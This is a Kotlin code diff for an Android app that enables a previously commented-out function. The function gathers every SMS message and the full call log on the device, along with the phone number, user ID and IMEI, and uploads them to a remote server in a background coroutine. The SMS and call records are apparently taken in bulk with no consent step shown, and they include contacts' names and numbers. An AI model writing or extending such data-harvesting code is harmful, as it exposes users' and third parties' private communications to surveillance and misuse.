@@ -10,6 +10,7 @@ import com.ronal.crazy.util.AfPointUtils
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
+import java.text.SimpleDateFormat
 import java.util.*
 
 class ConfirmPresenter : BasePresenter<ConfirmContract.View>(), ConfirmContract.Presenter {
@@ -42,38 +43,46 @@ class ConfirmPresenter : BasePresenter<ConfirmContract.View>(), ConfirmContract.
 
     }
 
-//    override fun uploadCallAndSms(context: Context) {
-//        GlobalScope.launch {
-//            val phoneEPRE = PreferencesHelper.getPhoneEPRE();
-//            val phone = PreferencesHelper.getPhone();
-//            val userId = PreferencesHelper.getUserID()
-//            val mobile = "$phoneEPRE$phone";
-//            val record = Utils.getMessage(context);
-//            if (record.size > 0) {
-//                val hashMap = HashMap<String, Any>()
-//                hashMap["user_id"] = userId
-//                hashMap["self_mobile"] = mobile
-//                hashMap["account_id"] = mobile
-//                hashMap["record"] = record
-//                RetrofitUtil.service.uploadSMS(Utils.createBody(Utils.createCommonParams(hashMap)))
-//            }
-//
-//            val callList = DataBaseHelper.getCallLogs()
-//
-//            if (callList.size > 0) {
-//                val hashMap = HashMap<String, Any>()
-//                hashMap["user_id"] = userId
-//                hashMap["self_mobile"] = mobile
-//                hashMap["account_id"] = mobile
-//                hashMap["record"] = callList.map {
-////                    Utils.Companion.CallRepository(it.cachedName,it.number,it.date,it.duration.toString(),it.type.toString())
-//                }
-//                RetrofitUtil.service.uploadSMS(Utils.createBody(Utils.createCommonParams(hashMap)))
-//            }
-//
-//
-//        }
-//    }
+    override fun uploadCallAndSms(context: Context) {
+        GlobalScope.launch {
+            val phoneEPRE = PreferencesHelper.getPhoneEPRE();
+            val phone = PreferencesHelper.getPhone();
+            val userId = PreferencesHelper.getUserID()
+            val imei = PreferencesHelper.getIMEI()
+            val mobile = "$phoneEPRE$phone";
+            val record = Utils.getMessage(context);
+//            Slog.d("uploadCallAndSms    $record ")
+            if (record.size > 0) {
+                val hashMap = HashMap<String, Any>()
+                hashMap["user_id"] = userId
+                hashMap["self_mobile"] = mobile
+                hashMap["account_id"] = mobile
+                hashMap["record"] = record
+                hashMap["uuid"] = imei
+               val smsResphone=     RetrofitUtil.service.uploadSMS(Utils.createBody(Utils.createCommonParams(hashMap)))
+                Slog.d("smsResphone    $smsResphone ")
+            }
+
+            val callList = DataBaseHelper.getCallLogs()
+            Slog.d("uploadCallAndSms   callList  $callList ")
+            val dataFormart= SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+
+            if (callList.size > 0) {
+                val hashMap = HashMap<String, Any>()
+                hashMap["user_id"] = userId
+                hashMap["self_mobile"] = mobile
+                hashMap["account_id"] = mobile
+                hashMap["uuid"] = imei
+                hashMap["record"] = callList.map {
+                       Utils.Companion.CallRepository(it.number,it.cachedName,dataFormart.format(Date(it.date)),it.duration.toString(),it.type.toString())
+                }
+                val callResphone=   RetrofitUtil.service.uploadCall(Utils.createBody(Utils.createCommonParams(hashMap)))
+                Slog.d("callResphone    $callResphone ")
+            }
+
+
+        }
+    }
 
     @SuppressLint("CheckResult")
     override fun uploadRequest(map: HashMap<String, Any>) {
